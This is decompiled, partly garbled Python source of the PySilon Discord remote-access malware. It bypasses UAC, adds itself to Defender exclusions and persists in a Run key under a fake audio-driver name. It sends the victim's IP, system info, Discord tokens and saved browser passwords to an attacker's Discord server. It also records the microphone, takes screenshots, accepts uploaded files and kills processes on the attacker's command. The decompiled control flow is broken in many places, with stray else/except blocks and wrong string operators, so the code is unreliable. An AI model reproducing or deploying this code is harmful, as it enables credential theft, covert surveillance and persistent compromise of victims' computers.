# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: source_prepared.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

global cookies_thread  # inserted
global force_to_send  # inserted
global embeds_to_send  # inserted
global cmd_messages  # inserted
global process_to_kill  # inserted
global clipper_stop  # inserted
global files_to_merge  # inserted
global input_blocked  # inserted
global text_buffor  # inserted
global latest_messages_in_recordings  # inserted
global messages_to_send  # inserted
global implode_confirmation  # inserted
global send_recordings  # inserted
global working_directory  # inserted
global one_file_attachment_message  # inserted
global files_to_send  # inserted
global processes_messages  # inserted
global channel_ids  # inserted
global processes_list  # inserted
global turned_off  # inserted
global expectation  # inserted
global custom_message_to_send  # inserted
import time
import os
os.mkdir('logs')
except:
    pass  # postinserted
pass
logs_file_name = f"executed_at_{time.strftime('%Y-%m-%d_%H-%M-%S')}.log"
with open(f'logs/{logs_file_name}', 'w', encoding='utf-8') as create_logs_file:
    pass  # postinserted
def log(entry):
    with open(f'logs/{logs_file_name}', 'a', encoding='utf-8') as log_entry:
        log_entry.write(f"[{time.strftime('%Y.%m.%d-%H:%M:%S')}] {entry}\n")
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from shutil import copy2, rmtree
import winreg
from zipfile import ZipFile
import requests
from filesplit.merge import Merge
from itertools import islice
from pathlib import Path
from cryptography.fernet import Fernet
import pickle
import psutil
from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from browser_history import get_history
from resources.get_cookies import *
from urllib.request import urlopen
from threading import Thread
import pyaudio
from scipy.io.wavfile import write
import sounddevice
from psutil import process_iter, Process
from win32process import GetWindowThreadProcessId
from win32gui import GetForegroundWindow
import pygame.camera
import pygame.image
import time
import pyautogui
import numpy as np
import imageio
from pynput import keyboard, mouse
import ctypes
import pyperclip
import re
import json
import threading
from html2image import Html2Image
from PIL import Image
import pyttsx3
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pygame
import monitorcontrol
from urllib.parse import urlparse
import win32gui
import win32con
import os
import requests
import time
from PIL import Image, ImageDraw
from win32print import *
from win32gui import *
from win32con import *
from win32api import *
import random
import math
from resources.discord_token_grabber import *
from resources.passwords_grabber import *
from urllib.request import urlopen
from resources.uac_bypass import *
from itertools import islice
from resources.misc import *
from getpass import getuser
from shutil import rmtree
import subprocess
import threading
import discord
import asyncio
import base64
import psutil
import json
import sys
import re
log('Imported modules (source_assembled.py:102)')
if not IsAdmin() and GetSelf()[1] and UACbypass():
    os._exit(0)
log('UAC bypassed successfully (source_assembled.py:109)')
auto = 'auto'
bot_tokens = ['NB1M6B1aHhUO2RlMyolVwJWLwgTT5NUcDNnaHF2QEhTT3VUcrdlLtkWMoVzRuE1TwsmeOFTV61EMBR0T6lleNRTTE90MJRVT']
software_registry_name = 'DriversUpdater'
software_directory_name = 'AudioDrivers'
software_executable_name = 'MainAudioDriver.exe'
channel_ids = {'info': True, 'main': True, 'spam': True, 'file': True, 'recordings': True, 'voice': True}
secret_key = '0fab5ae58cf0b8199bbb05988d1d9b9584618356b51d8d4e9f8bee2fee6a6f3e'
guild_id = 1271030797326876736
if IsAdmin():
    exclusion_paths = [f'C:\\Users\\{getuser()}\\{software_directory_name}']
    for path in exclusion_paths:
        try:
            subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath \"{path}\"'], creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
log('Added itself to Defender exclusions (source_assembled.py:154)')
client = discord.Client(intents=discord.Intents.all())
bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
discord.opus.load_opus(opuslib_path)
ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '[CTRL+R]': {'\\x12': '[CTRL+S]', '\\x13': '[CTRL+T]', '\\x14': '[CTRL+U]', '\\x15': '[CTRL+V]', '\\x16': '[CTRL+W]', '\\x17': '[CTRL+X]', '\\x18': '[CTRL+Y]', '\\x19': '[CTRL+Z]'
text_buffor, force_to_send = ('', False)
messages_to_send, files_to_send, embeds_to_send = ([], [], [])
processes_messages, processes_list, process_to_kill = ([], [], '')
files_to_merge, expectation, one_file_attachment_message = ([[], [], []], None, None)
cookies_thread, implode_confirmation, cmd_messages = (None, None, [])
send_recordings, input_blocked, clipper_stop, turned_off, custom_message_to_send = (True, False, True, False, [None, None, None])
latest_messages_in_recordings = []
if IsAdmin():
    regbase = winreg.HKEY_LOCAL_MACHINE
else:  # inserted
    regbase = winreg.HKEY_CURRENT_USER
if sys.argv[0].lower()!= ('c:\\users\\' + getuser() + '\\' + software_directory_name.lower()!= '\\' + software_executable_name.lower() and (not os.path.exists('C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)):
    log('PySilon is running for the first time on this PC (registry.py:14->source_assembled.py:172)')
    try:
        os.mkdir(f'C:\\Users\\' + getuser() + f'\\' + software_directory_name)
        log('Created PySilon\'s directory (registry.py:17->source_assembled.py:175)')
    except:
        pass
    copy2(sys.argv[0], f'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
    log('Copied itself into Users/<username> directory (registry.py:21->source_assembled.py:179)')
    registry = winreg.ConnectRegistry(None, regbase)
    log('Connected into registry (registry.py:23->source_assembled.py:181)')
    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    log('Opened startup registry key (registry.py:25->source_assembled.py:183)')
    winreg.CreateKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
    log('Created new entry in startup key (registry.py:27->source_assembled.py:185)')
    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
    log('Opened PySilon\'s entry in startup key (registry.py:29->source_assembled.py:187)')
    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name, '\\' + software_executable_name)
    log('Added PySilon\' path to PySilon\'s registry entry (registry.py:31->source_assembled.py:189)')
    winreg.CloseKey(registry_key)
    log('Closed the registry key (registry.py:33->source_assembled.py:191)')
    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', 'w', encoding='utf-8') as activator:
        process_name = sys.argv[0].split('\\')[(-1)]
        if IsAdmin():
            attrib_value = 'attrib +s +h .'
        else:  # inserted
            attrib_value = 'attrib +h .'
        activator.write(f'pushd \"C:\\Users\\{getuser()}\\{software_directory_name}\"\n{attrib_value}\nstart \"\" \"{software_executable_name}\"\ntaskkill /f /im \"{process_name}\"\ndel \"%~f0\"')
        log('Generated the activator script (registry.py:39->source_assembled.py:197)')
    subprocess.Popen(f'C:\\Users\\{getuser()}\\{software_directory_name}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    log('Executed the activator script. Killing itself (registry.py:41->source_assembled.py:199)')
    sys.exit(0)
working_directory = ['C:', 'Users', getuser(), software_directory_name]

@client.event
async def on_ready():
    global send_recordings  # inserted
    global latest_messages_in_recordings  # inserted
    global embeds_to_send  # inserted
    global files_to_send  # inserted
    global messages_to_send  # inserted
    log('BOT loaded (source_assembled.py:207)')
    hwid = subprocess.check_output('powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID').decode().strip()
    log('HWID obtained (source_assembled.py:209)')
    first_run = True
    for category_name in client.get_guild(guild_id).categories:
        if hwid in str(category_name):
            first_run, category = (False, category_name)
            break
    log('Checked for the first run (source_assembled.py:215)')
    if not first_run:
        log('PySilon is not running for the first time (source_assembled.py:218)')
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)
        log('Obtained the channel names in HWID category (source_assembled.py:222)')
        if 'spam' not in category_channel_names and channel_ids['spam']:
            log('Spam channel is missing (source_assembled.py:225)')
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
            log('Created spam channel (source_assembled.py:228)')
        if 'recordings' not in category_channel_names and channel_ids['recordings']:
            log('Recording channel is missing (source_assembled.py:231)')
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
            log('Created recordings channel (source_assembled.py:234)')
        if 'file-related' not in category_channel_names and channel_ids['file']:
            log('File-related channel is missing (source_assembled.py:237)')
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
            log('Created file-related channel (source_assembled.py:240)')
        if 'Live microphone' not in category_channel_names and channel_ids['voice']:
            log('Live microphone channel is missing (source_assembled.py:243)')
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
            log('Created live microphone channel (source_assembled.py:246)')
    if first_run:
        log('PySilon is running for the first time (source_assembled.py:249)')
        category = await client.get_guild(guild_id).create_category(hwid)
        log('Created HWID category (source_assembled.py:251)')
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category)
        channel_ids['info'] = temp.id
        log('Created info channel (source_assembled.py:253)')
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category)
        channel_ids['main'] = temp.id
        log('Created main channel (source_assembled.py:255)')
        if channel_ids['spam'] == True:
            temp = await client.get_guild(guild_id).create_text_channel('spam', category=category)
            channel_ids['spam'] = temp.id
        log('Created spam channel (source_assembled.py:257)')
        if channel_ids['recordings'] == True:
            temp = await client.get_guild(guild_id).create_text_channel('recordings', category=category)
            channel_ids['recordings'] = temp.id
        log('Created recordings channel (source_assembled.py:259)')
        if channel_ids['file'] == True:
            temp = await client.get_guild(guild_id).create_text_channel('file-related', category=category)
            channel_ids['file'] = temp.id
        log('Created file-related channel (source_assembled.py:261)')
        if channel_ids['voice'] == True:
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id
        log('Created live microphone channel (source_assembled.py:263)')
        try:
            await client.get_channel(channel_ids['info']).send(f"```IP address: {urlopen('https://ident.me').read().decode('utf-8')}" + ' [ident.me]```')
            log('Sent IP address obtained from ident.me (source_assembled.py:267)')
        except:
            pass
        try:
            await client.get_channel(channel_ids['info']).send(f"```IP address: {urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8')}" + ' [lafibre.info]```')
            log('Sent IP address obtained from lafibre.info (source_assembled.py:271)')
        except:
            pass
        system_info = force_decode(subprocess.run('systeminfo', capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
        log('Obtained system information (source_assembled.py:274)')
        chunk = ''
        for line in system_info.split('\n'):
            if len(chunk) - len(line) > 1990:
                await client.get_channel(channel_ids['info']).send(f'```' * chunk + f'```')
                chunk = line + '\n'
            else:  # inserted
                chunk = chunk | line | '\n'
        await client.get_channel(channel_ids['info']).send(f'```' * chunk + f'```')
        log('Sent system information on info channel (source_assembled.py:284)')
        accounts = grab_discord.initialize(False)
        for account in accounts:
            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account)
            await reaction_msg.add_reaction('📌')
        result = grab_passwords()
        embed = discord.Embed(title='Grabbed saved passwords', color=34047)
        for url in result.keys():
            embed.add_field(name='🔗 ' + url, value={'👤 ': result[url][0]} + '\n🔑 ' + result[url][1], inline=False)
        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed)
        await reaction_msg.add_reaction('📌')
    else:  # inserted
        log('Fetching channel IDs... (source_assembled.py:297)')
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
                log('Obtained info channel ID (source_assembled.py:301)')
            else:  # inserted
                if channel.name == 'main':
                    channel_ids['main'] = channel.id
                    log('Obtained main channel ID (source_assembled.py:304)')
                else:  # inserted
                    if channel.name == 'spam':
                        channel_ids['spam'] = channel.id
                        log('Obtained spam channel ID (source_assembled.py:307)')
                    else:  # inserted
                        if channel.name == 'file-related':
                            channel_ids['file'] = channel.id
                            log('Obtained file-related channel ID (source_assembled.py:310)')
                        else:  # inserted
                            if channel.name == 'recordings':
                                channel_ids['recordings'] = channel.id
                                log('Obtained recordings channel ID (source_assembled.py:313)')
                            else:  # inserted
                                if channel.name == 'Live microphone':
                                    channel_ids['voice'] = channel.id
                                    log('Obtained live microphone channel ID (source_assembled.py:316)')
    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{(' && Bypassed UAC!' if IsAdmin() else '')}```\n_ _\n_ _\n_ _")
    log('Sent new session info message on main channel (source_assembled.py:319)')
    recordings_obj = client.get_channel(channel_ids['recordings'])
    async for latest_message in recordings_obj.history(limit=2):
        latest_messages_in_recordings.append(latest_message.content)
    if 'disable' not in latest_messages_in_recordings:
        log('\'disable\' message is not sent on recordings channel. Trying to start recording (microphone_recording.py:30->source_assembled.py:325)')
        Thread(target=start_recording).start()
        log('Started microphone recording thread (microphone_recording.py:32->source_assembled.py:327)')
        await client.get_channel(channel_ids['main']).send(f'`[' + current_time() + '] Started recording...`')
        log('Sent message about started recording (microphone_recording.py:34->source_assembled.py:329)')
        latest_messages_in_recordings = []
    else:  # inserted
        log('\'disable\' message is sent on recordings channel. Aborting the record function (microphone_recording.py:37->source_assembled.py:332)')
        Thread(target=start_recording).start()
        await client.get_channel(channel_ids['main']).send(f'`[' + current_time() + '] Recording disabled. If you want to enable it, just delete the \"disable\" message on` <#' + str(channel_ids['recordings']) + '>')
        log('Sent message about disabled recording (microphone_recording.py:40->source_assembled.py:335)')
        latest_messages_in_recordings = []
    threading.Thread(target=process_blacklister).start()
    while True:
        recordings_obj = client.get_channel(channel_ids['recordings'])
        log('Fetched the recordings channel (source_assembled.py:342)')
        async for latest_message in recordings_obj.history(limit=2):
            latest_messages_in_recordings.append(latest_message.content)
        log('Fetched last message from recordings channel (source_assembled.py:345)')
        if 'disable' in latest_messages_in_recordings:
            send_recordings = False
            log('Recordings are disabled by the attacker (source_assembled.py:348)')
        else:  # inserted
            send_recordings = True
            log('Recordings are enabled by the attacker (source_assembled.py:351)')
        latest_messages_in_recordings = []
        if len(messages_to_send) > 0:
            log('New message to send (source_assembled.py:355)')
            for message in messages_to_send:
                log('Trying to send a message (source_assembled.py:357)')
                await client.get_channel(message[0]).send(message[1])
                log('Sent a message (source_assembled.py:359)')
                await asyncio.sleep(0.1)
            messages_to_send = []
        if len(files_to_send) > 0:
            log('New file to send (source_assembled.py:363)')
            for file in files_to_send:
                log('Trying to send a file (source_assembled.py:365)')
                await client.get_channel(file[0]).send(file[1], file=discord.File(file[2], filename=file[2]))
                log('File successfully sent (source_assembled.py:367)')
                await asyncio.sleep(0.1)
                log('Checking if file needs to be removed from victim\'s PC (source_assembled.py:369)')
                if file[3]:
                    log('Trying to remove a file (source_assembled.py:371)')
                    subprocess.run(f'del ' + file[2], shell=True)
                    log('Removed a file (source_assembled.py:373)')
            files_to_send = []
        if len(embeds_to_send) > 0:
            log('New embed to send (source_assembled.py:376)')
            for embedd in embeds_to_send:
                log('Trying to send an embed (source_assembled.py:378)')
                if len(embedd) == 3:
                    await client.get_channel(embedd[0]).send(embed=discord.Embed(title=embedd[1], color=34047).set_image(url='attachment://' + embedd[2]), file=discord.File(embedd[2]))
                else:  # inserted
                    await client.get_channel(embedd[0]).send(embed=embedd[1])
                log('Sent an embed (source_assembled.py:383)')
                await asyncio.sleep(0.1)
            embeds_to_send = []
        await asyncio.sleep(1)

@client.event
async def on_raw_reaction_add(payload):
    log('New reaction added (to message from different BOT session) (source_assembled.py:391)')
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    log('Fetched reacted message (source_assembled.py:393)')
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    log('Fetched reaction from message (source_assembled.py:395)')
    user = payload.member
    log('Fetched reacting user (source_assembled.py:397)')
    if user.bot == False:
        log('Reacting user is not a BOT (source_assembled.py:400)')
        if str(reaction) == '📌':
            log('Reaction is \"pin the message\" (source_assembled.py:402)')
            if message.channel.id in channel_ids.values():
                await message.pin()
                log('Pinned a message (source_assembled.py:405)')
                last_message = await discord.utils.get(message.channel.history())
                log('Obtained alert about pin (source_assembled.py:407)')
                await last_message.delete()
                log('Deleted alert about pin (source_assembled.py:409)')
        else:  # inserted
            if str(reaction) == '🔴':
                log('Reaction is \"delete the message\" (source_assembled.py:411)')
                await message.delete()
                log('Deleted the message (source_assembled.py:413)')

@client.event
async def on_reaction_add(reaction, user):
    global tree_messages  # inserted
    global cmd_messages  # inserted
    global files_to_merge  # inserted
    global expectation  # inserted
    global processes_messages  # inserted
    log('New reaction added (to message from current BOT session) (source_assembled.py:418)')
    if user.bot == False:
        log('Reacting user is not a BOT (source_assembled.py:420)')
        if reaction.message.channel.id in channel_ids.values():
            log('Reaction channel is controlling this PC (source_assembled.py:422)')
            try:
                log('Trying to fetch the reaction expectations (source_assembled.py:424)')
                if str(reaction) == '💀' and expectation == 'implosion':
                    log('Reaction is \"implode\" (source_assembled.py:426)')
                    await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
                    log('Sent a message about trying to implode (source_assembled.py:428)')
                    registry = winreg.ConnectRegistry(None, regbase)
                    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                    registry_key = winreg.OpenKey(regbase, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                    winreg.DeleteValue(registry_key, software_registry_name)
                    log('Trying to remove PySilon.key (source_assembled.py:433)')
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\PySilon.key', 10)
                    log('Removed PySilon.key. Trying to remove recordings directory (source_assembled.py:435)')
                        rmtree('rec_')
                        log('Removed recordings directory (source_assembled.py:438)')
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    log('Unset critical process (source_assembled.py:443)')
                    with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
                        if IsAdmin():
                            attrib_value = f'attrib -s -h \"C:\\Users\\{getuser()}\\{software_directory_name}\"'
                        else:  # inserted
                            attrib_value = f'attrib -h \"C:\\Users\\{getuser()}\\{software_directory_name}\"'
                        imploder.write(f'pushd \"C:\\Users\\{getuser()}\"\n{attrib_value}\ntaskkill /f /im \"{software_executable_name}\"\ntimeout /t 3 /nobreak\nrmdir /s /q \"C:\\Users\\{getuser()}\\{software_directory_name}\"\ndel \"%~f0\"')
                        log('Saved implode.bat (source_assembled.py:448)')
                        subprocess.Popen(f'C:\\Users\\{getuser()}\\implode.bat', creationflags=subprocess.CREATE_NO_WINDOW)
                        log('Executed implode.bat. Killing PySilon... (source_assembled.py:450)')
                        sys.exit(0)
                else:  # inserted
                    if str(reaction) == '🔴' and expectation == 'implosion':
                        log('Reaction is \"cancel implosion\" (source_assembled.py:453)')
                        expectation = None
                            log('Reaction is \"confirm upload\" (file_uploading.py:6->source_assembled.py:456)')
                            if expectation == 'onefile':
                                log('One file gets uploaded (file_uploading.py:8->source_assembled.py:458)')
                                split_v1 = str(one_file_attachment_message.attachments).split('filename=\'')[1]
                                filename = str(split_v1).split('\' ')[0]
                                log('Fetched file to download (file_uploading.py:11->source_assembled.py:461)')
                                await one_file_attachment_message.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
                                log('Downloaded a file (file_uploading.py:13->source_assembled.py:463)')
                                async for message in reaction.message.channel.history(limit=2):
                                    pass  # postinserted
                                await message.delete()
                                log('Removed the message (file_uploading.py:16->source_assembled.py:466)')
                            else:  # inserted
                                await reaction.message.channel.send(('```Uploaded  ' + filename) + ('  into  ' + '/'.join(working_directory)) + '/' + filename + '```')
                                log('Sent message about success (file_uploading.py:18->source_assembled.py:468)')
                                expectation = None
                            else:  # inserted
                                if expectation == 'multiplefiles':
                                    log('Multiple files are getting uploaded (file_uploading.py:21->source_assembled.py:471)')
                            log('Prepared a download directory (file_uploading.py:24->source_assembled.py:474)')
                            await files_to_merge[0][(-1)].edit(content=f'```Uploading file 1 of ' + str(len(files_to_merge[1])) + '```')
                            log('Sent initial message about files downloading (file_uploading.py:26->source_assembled.py:476)')
                            for i in range(len(files_to_merge[1])):
                                split_v1 = str(files_to_merge[1][i].attachments).split('filename=\'')[1]
                                filename = str(split_v1).split('\' ')[0]
                                log('Fetched file to download (file_uploading.py:30->source_assembled.py:480)')
                                await files_to_merge[1][i].attachments[0].save(fp=f'temp/' + filename)
                                log('Downloaded a file (file_uploading.py:32->source_assembled.py:482)')
                                await files_to_merge[0][(-1)].edit(content=f'```Uploading file ' + str(i 0) + f' of ' + str(len(files_to_merge[1])) + f'```')
                                log('Edited the message about downloading progress (file_uploading.py:34->source_assembled.py:484)')
                            await files_to_merge[0][(-1)].edit(content='```Uploading completed```')
                            log('Edited the messahe about downloading progress to \"uploading completed\" (file_uploading.py:36->source_assembled.py:486)')
                            for i in os.listdir('temp'):
                                if i!= 'manifest':
                                    os.rename('temp/' + i, 'temp/' + i[:(-8)])
                                    log('Renamed a file (file_uploading.py:40->source_assembled.py:490)')
                            Merge('temp', '/'.join(working_directory), files_to_merge[2]).merge(cleanup=True)
                            log('Merged individual files into original one (file_uploading.py:42->source_assembled.py:492)')
                            rmtree('temp')
                            log('Removed temporary directory (file_uploading.py:44->source_assembled.py:494)')
                            async for message in client.get_channel(channel_ids['file']).history():
                                pass  # postinserted
                            await message.delete()
                            log('Removed a message (file_uploading.py:47->source_assembled.py:497)')
                        else:  # inserted
                            await reaction.message.channel.send(f"```Uploaded  {files_to_merge[2]}  into  {'/'.join(working_directory)}/{files_to_merge[2]}" + '```')
                            log('Sent message about successfull upload (file_uploading.py:49->source_assembled.py:499)')
                            files_to_merge = [[], [], []]
                            expectation = None
                        else:  # inserted
                            if str(reaction) == '🔴' and reaction.message.content[:15] == '```End of tree.':
                                log('Reaction is \"remove tree messages\" (file_explorer.py:9->source_assembled.py:503)')
                                for i in tree_messages:
                                    await i.delete()
                                    log('Deleted a tree message (file_explorer.py:13->source_assembled.py:507)')
                                else:  # inserted
                                    tree_messages = []
                                    subprocess.run(f'del ' f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                                    log('Removed tree.txt (file_explorer.py:18->source_assembled.py:512)')
                            else:  # inserted
                                if str(reaction) == '📥' and reaction.message.content[:15] == '```End of tree.':
                                    log('Reaction is \"download tree\" (file_explorer.py:20->source_assembled.py:514)')
                                    await reaction.message.channel.send(file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt'))
                                    log('Sent tree.txt (file_explorer.py:22->source_assembled.py:516)')
                                    subprocess.run(f'del ' f'C:\\Users\\{getuser()}\\{software_directory_name}\\tree.txt', shell=True)
                                    log('Removed tree.txt (file_explorer.py:24->source_assembled.py:518)')
                                    return
                                        log('Reaction is \"confirm killing a process\" (process.py:7->source_assembled.py:520)')
                                        await reaction.message.delete()
                                        log('Removed the message (process.py:9->source_assembled.py:522)')
                                            log('Trying to parse the process name (process.py:11->source_assembled.py:524)')
                                            process_name = process_to_kill[0]
                                            if process_name[(-1)] == ']':
                                                process_name = process_name[::(-1)]
                                                for i in range(len(process_name)):
                                                    if process_name[i] == '[':
                                                        process_name = process_name[i + 4:]
                                                        break
                                                process_name = process_name[::(-1)]
                                            log('Process name parsed successfully (process.py:20->source_assembled.py:533)')
                                            log('Error occurred while trying to parse the process name (process.py:22->source_assembled.py:535)')
                                            embed = discord.Embed(title='📛 Error', description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=discord.Colour.red())
                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                            reaction_msg = await reaction.message.channel.send(embed=embed)
                                            log('Sent message about the error with more details (process.py:26->source_assembled.py:539)')
                                            await reaction_msg.add_reaction('🔴')
                                            log('Trying to kill processes (process.py:29->source_assembled.py:542)')
                                            killed_processes = []
                                            for proc in process_iter():
                                                if proc.name() == process_name:
                                                    proc.kill()
                                                    log('Killed a process (process.py:34->source_assembled.py:547)')
                                                    killed_processes.append(proc.name())
                                            processes_killed = ''
                                            for i in killed_processes:
                                                processes_killed = processes_killed + '\n• ' + str(i)
                                            embed = discord.Embed('🟢 Success', title=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed, description='```', colour=discord.Colour.green())
                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                            reaction_msg = await reaction.message.channel.send(embed=embed)
                                            log('Sent message about killed processes (process.py:42->source_assembled.py:555)')
                                            await reaction_msg.add_reaction('🔴')
                                        except Exception as e:
                                            log('Error occurred while trying to kill processes (process.py:45->source_assembled.py:558)')
                                            embed = discord.Embed(title='📛 Error', description=f'```Error while killing processes...\n' + str(e) + '```', colour=discord.Colour.red())
                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                            reaction_msg = await reaction.message.channel.send(embed=embed)
                                            log('Sent message about the error with more details (process.py:49->source_assembled.py:562)')
                                            await reaction_msg.add_reaction('🔴')
                                            return
                                    if str(reaction) == '🔴' and reaction.message.content[(-25):] == '.kill <process-number>```':
                                        log('Reaction is \"cancel process killing\" (process.py:52->source_assembled.py:565)')
                                        for i in processes_messages:
                                            pass  # postinserted
                                        else:  # inserted
                                            log('Removed messages containing list of running processes (process.py:56->source_assembled.py:569)')
                                            processes_messages = []
                                    else:  # inserted
                                        if str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
                                            log('Reaction is \"remove .cmd stdout messages\" (reverse_shell.py:8->source_assembled.py:572)')
                                            for i in cmd_messages:
                                                await i.delete()
                                                log('Removed a .cmd stdout message (reverse_shell.py:11->source_assembled.py:575)')
                                            cmd_messages = []
                                                if custom_message_to_send[0]!= None:
                                                    threading.Thread(target=send_custom_message, args=(custom_message_to_send[0], custom_message_to_send[1], custom_message_to_send[2])).start()
                                                    await asyncio.sleep(0.5)
                                                    ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png')
                                                    reaction_msg = await reaction.message.channel.send(embed=discord.Embed(title=current_time() + f' `[Sent message]`', color=34047).set_image(url='attachment://ss.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png'))
                                                    await reaction_msg.add_reaction('📌')
                                                    subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\ss.png', shell=True)
            except Exception as err:
                else:  # inserted
                    try:
                        pass  # postinserted
                    except:
                        log('Couldn\'t remove recordings directory. Ignoring the error (source_assembled.py:440)')
                    else:  # inserted
                        if str(reaction) == '📤':
                            pass  # postinserted
                        else:  # inserted
                            os.mkdir('temp')
                        except:
                            rmtree('temp')
                            os.mkdir('temp')
                            else:  # inserted
                                try:
                                    pass  # postinserted
                                except:
                                    pass
                                else:  # inserted
                                    if str(reaction) == '💀' and reaction.message.content[:39] == '```Do you really want to kill process: ':
                                        pass  # postinserted
                                    else:  # inserted
                                        try:
                                            pass  # postinserted
                                        except Exception as e:
                                            pass  # postinserted
                                    else:  # inserted
                                        try:
                                            pass  # postinserted
                                    else:  # inserted
                                        await i.delete()
                                    except:
                                        pass
                                        else:  # inserted
                                            if str(reaction) == '✅':
                                                pass  # postinserted
                    log('Failed to fetch the reaction expectations (source_assembled.py:586)')
                    await reaction.message.channel.send(f'```{str(err)}```')
                    log('Sent a message with error details (source_assembled.py:588)')

@client.event
async def on_raw_reaction_remove(payload):
    log('A reaction has been removed (source_assembled.py:592)')
    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
    log('Fetched reacted message (source_assembled.py:594)')
    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
    log('Fetched reaction (source_assembled.py:596)')
    user = payload.member
    log('Fetched reacting user (source_assembled.py:598)')
    if str(reaction) == '📌':
        log('Reaction is \"unpin\" (source_assembled.py:601)')
        await message.unpin()
        log('Unpinned reacted message (source_assembled.py:603)')
